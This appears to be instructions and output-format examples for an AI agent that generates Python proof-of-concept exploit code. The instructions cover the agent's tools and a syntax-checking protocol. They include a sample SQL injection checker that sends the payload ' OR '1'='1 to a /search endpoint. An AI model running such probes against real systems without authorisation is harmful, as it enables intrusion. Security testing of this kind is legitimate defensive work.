## Python POC Code Generation Output Format Examples

Your workflow must follow this protocol:

*   **Initial coding**: Use `write_python_poc` to generate initial Python POC code.
*   **Iterative modification**: All subsequent modifications should use `modify_python_poc`, `insert_python_poc`, or `delete_python_poc`.
*   **Syntax validation**: The system automatically runs Python syntax checking after each write/modify. Check the feedback for errors.

### Diagnose-Before-Treat Protocol

1.  After `modify_python_poc`, carefully analyze the feedback for syntax errors.
2.  If there are syntax errors, you **must fix them immediately** without guessing.
3.  Only after the code has no syntax errors should you exit the focus mode.

**No guessing**: It is forbidden to make speculative fixes using `modify_python_poc` without understanding the root cause.

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL Injection POC
Target: Example vulnerable endpoint
"""

import requests
import sys
from urllib.parse import urljoin

class SQLInjectionPOC:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()

    def check_vulnerability(self):
        payload = "' OR '1'='1"
        try:
            resp = self.session.get(
                urljoin(self.target_url, f"/search?q={payload}"),
                timeout=self.timeout
            )
            if "error in your SQL syntax" in resp.text.lower():
                return True, "SQL injection vulnerability detected!"
            return False, "Target appears not vulnerable"
        except Exception as e:
            return False, f"Error: {str(e)}"

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 poc.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    poc = SQLInjectionPOC(target_url)

    print(f"[*] Testing target: {target_url}")
    is_vuln, msg = poc.check_vulnerability()
    print(f"[{'+'if is_vuln else '-'}] {msg}")

if __name__ == "__main__":
    main()

## Action Summary

### Actions that require `<|GEN_PYTHON_POC...|>` tags:
- `write_python_poc` - Create a new Python POC file
- `modify_python_poc` - Modify existing Python POC code
- `insert_python_poc` - Insert new lines at a position

### Actions that do NOT require `<|GEN_PYTHON_POC...|>` tags:
- `delete_python_poc` - Delete lines (only needs line numbers)
- `directly_answer` - Complete the task
- `check_python_env` - Report environment check result
- `verify_syntax` - Confirm syntax verification
